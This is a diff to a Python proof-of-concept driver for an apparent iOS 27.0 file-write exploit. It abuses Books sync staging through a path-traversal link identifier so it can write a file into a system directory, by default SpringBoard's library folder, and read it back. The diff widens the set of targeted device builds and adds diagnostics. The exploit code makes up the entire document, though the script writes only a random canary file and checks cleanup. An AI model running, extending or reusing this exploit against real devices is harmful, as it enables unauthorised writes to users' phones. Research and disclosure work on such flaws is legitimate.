@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-"""Fresh-file write and export-readback PoC for iOS 27.0 (24A435)."""
+"""Fresh-file write and export-readback PoC for supported iOS 27.0 builds."""
 
 from __future__ import annotations
 
@@ -10,6 +10,7 @@ import json
 import os
 import plistlib
 import posixpath
+import re
 import secrets
 import stat
 import struct
@@ -21,56 +22,116 @@ from pathlib import Path
 from typing import Any
 
 
-PRODUCT = "iPhone18,2"
-VERSION = "27.0"
-BUILD = "24A435"
+ROOT = Path(__file__).resolve().parent
+TARGET_HEADER = ROOT / "Sources" / "airlift_target.h"
+DEVICE_HELPER = ROOT / "build" / "device_helper"
+AIRTRAFFIC_HOST = ROOT / "build" / "airtraffic_host"
+TARGET_TEXT = TARGET_HEADER.read_text(encoding="utf-8")
+
+
+def header_string(name: str) -> str:
+    match = re.search(
+        rf'^#define\s+{re.escape(name)}\s+@"([^"]*)"$',
+        TARGET_TEXT,
+        re.MULTILINE,
+    )
+    if not match:
+        raise RuntimeError(f"missing {name} in {TARGET_HEADER}")
+    return match.group(1)
+
+
+def header_targets(name: str) -> tuple[tuple[str, str], ...]:
+    match = re.search(
+        rf"^#define\s+{re.escape(name)}\(X\)\s+(.*?)(?=^\s*$)",
+        TARGET_TEXT,
+        re.MULTILINE | re.DOTALL,
+    )
+    if not match:
+        raise RuntimeError(f"missing {name} in {TARGET_HEADER}")
+    targets = tuple(
+        re.findall(r'X\(@"([^"]+)",\s*@"([^"]+)"\)', match.group(1))
+    )
+    if not targets:
+        raise RuntimeError(f"empty {name} in {TARGET_HEADER}")
+    return targets
+
+
+VERSION = header_string("AIRLIFT_TARGET_VERSION")
+TESTED_TARGETS = frozenset(
+    (product, VERSION, build)
+    for product, build in header_targets("AIRLIFT_TESTED_TARGETS")
+)
+EXPECTED_TARGETS = frozenset(
+    (product, VERSION, build)
+    for product, build in header_targets("AIRLIFT_EXPECTED_TARGETS")
+)
+SUPPORTED_TARGETS = TESTED_TARGETS | EXPECTED_TARGETS
+SOURCE_PREFIX = header_string("AIRLIFT_SOURCE_PREFIX")
+LINK_PREFIX = header_string("AIRLIFT_LINK_PREFIX")
+RECOVERED_PREFIX = header_string("AIRLIFT_RECOVERED_PREFIX")
+CANARY_PREFIX = header_string("AIRLIFT_CANARY_PREFIX")
+
 DEFAULT_TARGET = "/var/mobile/Library/SpringBoard"
 AIRLOCK_ROOT = "/var/mobile/Media/Airlock/Book"
 SZ_EXTRA_ID = 0x5A53
 
-ROOT = Path(__file__).resolve().parent
-DEVICE_HELPER = ROOT / "build" / "device_helper"
-AIRTRAFFIC_HOST = ROOT / "build" / "airtraffic_host"
-
 
 class AirLiftError(RuntimeError):
-    pass
+    def __init__(self, message: str, details: dict[str, Any] | None = None):
+        super().__init__(message)
+        self.details = details
 
 
-def device_version(properties: dict[str, Any]) -> str:
-    value = (
-        properties.get("software", {})
-        .get("osVersionNumber", {})
-        .get("stringValue")
-    )
+def device_version(
+    device_properties: dict[str, Any], properties: dict[str, Any]
+) -> str:
+    value = device_properties.get("osVersionNumber")
+    if not isinstance(value, str):
+        value = (
+            properties.get("software", {})
+            .get("osVersionNumber", {})
+            .get("stringValue")
+        )
     return value if isinstance(value, str) else "unknown"
 
 
-def device_build(properties: dict[str, Any]) -> str:
-    value = (
-        properties.get("software", {})
-        .get("osBuildVersions", {})
-        .get("buildVersion", {})
-        .get("name")
-    )
+def device_build(
+    device_properties: dict[str, Any], properties: dict[str, Any]
+) -> str:
+    value = device_properties.get("osBuildUpdate")
+    if not isinstance(value, str):
+        value = (
+            properties.get("software", {})
+            .get("osBuildVersions", {})
+            .get("buildVersion", {})
+            .get("name")
+        )
     return value if isinstance(value, str) else "unknown"
 
 
-def available_devices(devices: list[dict[str, Any]]) -> list[dict[str, str]]:
-    matches: list[dict[str, str]] = []
+def available_devices(devices: list[dict[str, Any]]) -> list[dict[str, Any]]:
+    matches: list[dict[str, Any]] = []
     for device in devices:
         properties = device.get("properties", {})
-        connection = properties.get("connection", {})
-        hardware = properties.get("hardware", {})
-        state = properties.get("state", {})
+        connection = device.get("connectionProperties")
+        hardware = device.get("hardwareProperties")
+        state = device.get("deviceProperties")
+        if not isinstance(connection, dict):
+            connection = properties.get("connection", {})
+        if not isinstance(hardware, dict):
+            hardware = properties.get("hardware", {})
+        if not isinstance(state, dict):
+            state = properties.get("state", {})
+
         udid = hardware.get("udid")
+        product = hardware.get("productType")
+        version = device_version(state, properties)
+        build = device_build(state, properties)
+        target = (product, version, build)
         if not (
             hardware.get("reality") == "physical"
-            and hardware.get("productType") == PRODUCT
             and connection.get("pairingState") == "paired"
-            and connection.get("state") == "connected"
-            and device_version(properties) == VERSION
-            and device_build(properties) == BUILD
+            and target in SUPPORTED_TARGETS
             and isinstance(udid, str)
             and udid
         ):
@@ -79,30 +140,44 @@ def available_devices(devices: list[dict[str, Any]]) -> list[dict[str, str]]:
         transport = {
             "localNetwork": "Wi-Fi",
             "wired": "USB",
-        }.get(connection.get("transportType"), "connected")
+        }.get(connection.get("transportType"), "paired")
         name = state.get("name")
         model = hardware.get("marketingName")
         matches.append(
             {
-                "name": name if isinstance(name, str) and name else PRODUCT,
-                "model": model if isinstance(model, str) and model else PRODUCT,
+                "name": name if isinstance(name, str) and name else product,
+                "model": model if isinstance(model, str) and model else product,
+                "product": product,
+                "version": version,
+                "build": build,
                 "transport": transport,
+                "tested": target in TESTED_TARGETS,
                 "udid": udid,
             }
         )
     return sorted(matches, key=lambda item: (item["name"], item["udid"]))
 
 
-def choose_device(devices: list[dict[str, str]], requested: str | None) -> str:
-    if not devices:
-        raise AirLiftError(
-            f"no connected paired {PRODUCT} on iOS {VERSION} ({BUILD}) found"
+def selected_device(device: dict[str, Any]) -> dict[str, Any]:
+    if not device["tested"]:
+        print(
+            f"Warning: {device['product']} on iOS {device['version']} "
+            f"({device['build']}) is expected to work but has not been tested.",
+            file=sys.stderr,
         )
+    return device
+
+
+def choose_device(
+    devices: list[dict[str, Any]], requested: str | None
+) -> dict[str, Any]:
+    if not devices:
+        raise AirLiftError("no paired iPhone matching a supported target found")
 
     if requested:
         for device in devices:
             if device["udid"].casefold() == requested.casefold():
-                return device["udid"]
+                return selected_device(device)
         raise AirLiftError("requested device is not connected and compatible")
 
     if not sys.stdin.isatty():
@@ -112,7 +187,8 @@ def choose_device(devices: list[dict[str, str]], requested: str | None) -> str:
     for index, device in enumerate(devices, 1):
         print(f"  [{index}] {device['name']}", file=sys.stderr)
         print(
-            f"      {device['model']} · iOS {VERSION} ({BUILD}) · "
+            f"      {device['model']} · iOS {device['version']} "
+            f"({device['build']}) · "
             f"{device['transport']}",
             file=sys.stderr,
         )
@@ -132,11 +208,11 @@ def choose_device(devices: list[dict[str, str]], requested: str | None) -> str:
         except ValueError:
             selection = 0
         if 1 <= selection <= len(devices):
-            return devices[selection - 1]["udid"]
+            return selected_device(devices[selection - 1])
         print(f"Enter a number from 1 to {len(devices)}.", file=sys.stderr)
 
 
-def resolve_device(requested: str | None) -> str:
+def resolve_device(requested: str | None) -> dict[str, Any]:
     command = [
         "xcrun",
         "devicectl",
@@ -147,7 +223,6 @@ def resolve_device(requested: str | None) -> str:
         "--quiet",
         "--json-output",
         "-",
-        "--omit-deprecated-fields-in-json",
     ]
     completed = subprocess.run(
         command,
@@ -247,6 +322,10 @@ def native(command: str, udid: str, *arguments: str) -> dict[str, Any]:
     )
 
 
+def error_details(error: Exception) -> dict[str, str]:
+    return {"type": type(error).__name__, "message": str(error)}
+
+
 def operation_ok(result: dict[str, Any]) -> bool:
     return bool(
         result.get("exitCode") == 0
@@ -259,9 +338,13 @@ def preflight(udid: str) -> None:
     result = native("probe", udid)
     operation = result.get("operation", {})
     if not operation_ok(result):
-        raise AirLiftError("device/build preflight failed")
+        raise AirLiftError(
+            "device/build preflight failed", {"preflight": result}
+        )
     if operation.get("booksSyncPlistPresent") is not False:
-        raise AirLiftError("Books sync staging is already in use")
+        raise AirLiftError(
+            "Books sync staging is already in use", {"preflight": result}
+        )
 
 
 def attempt(
@@ -271,11 +354,12 @@ def attempt(
     payload: bytes,
     *,
     recovery_only: bool,
+    verbose: bool,
 ) -> dict[str, Any]:
     token = secrets.token_hex(10)
-    source = f"airlift-src-{BUILD}-{token}"
-    link_destination = f"airlift-link-{BUILD}-{token}"
-    recovered = f"airlift-recovered-{BUILD}-{token}"
+    source = f"{SOURCE_PREFIX}{token}"
+    link_destination = f"{LINK_PREFIX}{token}"
+    recovered = f"{RECOVERED_PREFIX}{token}"
     link_identifier = f"../../{source}/p0/p1/p2/link"
     target_path = posixpath.join(target, leaf)
     target_identifier = posixpath.relpath(target_path, AIRLOCK_ROOT)
@@ -304,7 +388,9 @@ def attempt(
         preflight(udid)
         stage: dict[str, Any] = {"operation": {"ok": False}}
         atc: dict[str, Any] = {"ok": False}
+        finish: dict[str, Any] = {"operation": {"ok": False}}
         operation_error: Exception | None = None
+        finish_error: Exception | None = None
         try:
             stage = native(
                 "stage",
@@ -323,50 +409,75 @@ def attempt(
         except Exception as error:
             operation_error = error
         finally:
-            finish = native(
-                "finish",
-                udid,
-                source,
-                link_destination,
-                recovered,
-                os.fspath(expected_path),
-                target[1:],
-                leaf,
-            )
+            try:
+                finish = native(
+                    "finish",
+                    udid,
+                    source,
+                    link_destination,
+                    recovered,
+                    os.fspath(expected_path),
+                    target[1:],
+                    leaf,
+                )
+            except Exception as error:
+                finish_error = error
 
     operation = finish.get("operation", {})
-    return {
+    result = {
         "stageSucceeded": operation_ok(stage),
         "airTrafficSucceeded": bool(atc.get("exitCode") == 0 and atc.get("ok")),
         "exactBytesRecovered": bool(operation.get("recoveredBytesMatch")),
         "cleanupComplete": bool(operation.get("cleanupComplete")),
         "targetAbsent": operation.get("targetAbsent"),
-        "operationError": (
-            type(operation_error).__name__ if operation_error else None
-        ),
     }
+    attempt_ok = bool(
+        result["stageSucceeded"]
+        and result["airTrafficSucceeded"]
+        and result["exactBytesRecovered"]
+        and result["cleanupComplete"]
+    )
+    if verbose or not attempt_ok:
+        diagnostics: dict[str, Any] = {
+            "stage": stage,
+            "airTraffic": atc,
+            "finish": finish,
+        }
+        if operation_error:
+            diagnostics["operationError"] = error_details(operation_error)
+        if finish_error:
+            diagnostics["finishError"] = error_details(finish_error)
+        result["diagnostics"] = diagnostics
+    return result
 
 
-def run(target: str, requested_device: str | None) -> dict[str, Any]:
+def run(
+    target: str, requested_device: str | None, *, verbose: bool
+) -> dict[str, Any]:
     if not DEVICE_HELPER.is_file() or not AIRTRAFFIC_HOST.is_file():
         raise AirLiftError("helpers are not built; run make first")
 
-    udid = resolve_device(requested_device)
+    device = resolve_device(requested_device)
+    udid = device["udid"]
+    build = device["build"]
     preflight(udid)
-    leaf = f"airlift-canary-{BUILD}-{secrets.token_hex(16)}.bin"
+    leaf = f"{CANARY_PREFIX}{secrets.token_hex(16)}.bin"
     payload = (
-        f"airlift canary\nbuild={BUILD}\nnonce={secrets.token_hex(24)}\n"
+        f"airlift canary\nbuild={build}\nnonce={secrets.token_hex(24)}\n"
     ).encode()
 
     primary = attempt(
-        udid, target, leaf, payload, recovery_only=False
+        udid, target, leaf, payload, recovery_only=False, verbose=verbose
     )
     recovery = None
     if not primary["exactBytesRecovered"]:
         if not primary["cleanupComplete"]:
-            raise AirLiftError("primary cleanup was incomplete; refusing to continue")
+            raise AirLiftError(
+                "primary cleanup was incomplete; refusing to continue",
+                {"primary": primary},
+            )
         recovery = attempt(
-            udid, target, leaf, payload, recovery_only=True
+            udid, target, leaf, payload, recovery_only=True, verbose=verbose
         )
 
     exact = primary["exactBytesRecovered"] or bool(
@@ -378,6 +489,12 @@ def run(target: str, requested_device: str | None) -> dict[str, Any]:
     preflight(udid)
     return {
         "ok": bool(exact and clean),
+        "device": {
+            "product": device["product"],
+            "version": device["version"],
+            "build": build,
+            "tested": device["tested"],
+        },
         "targetDirectory": target,
         "generatedLeaf": leaf,
         "payloadLength": len(payload),
@@ -396,11 +513,21 @@ def main() -> int:
     parser = argparse.ArgumentParser(description=__doc__)
     parser.add_argument("--target", default=DEFAULT_TARGET)
     parser.add_argument("--device", metavar="UDID", help="skip the device picker")
+    parser.add_argument(
+        "--verbose", action="store_true", help="include helper diagnostics"
+    )
     arguments = parser.parse_args()
     try:
-        result = run(normalize_target(arguments.target), arguments.device)
+        result = run(
+            normalize_target(arguments.target),
+            arguments.device,
+            verbose=arguments.verbose,
+        )
     except (AirLiftError, OSError, subprocess.SubprocessError, ValueError) as error:
-        print(json.dumps({"ok": False, "error": str(error)}, sort_keys=True))
+        result = {"ok": False, "error": str(error)}
+        if isinstance(error, AirLiftError) and error.details:
+            result["diagnostics"] = error.details
+        print(json.dumps(result, sort_keys=True))
         return 1
     print(json.dumps(result, indent=2, sort_keys=True))
     return 0 if result["ok"] else 2
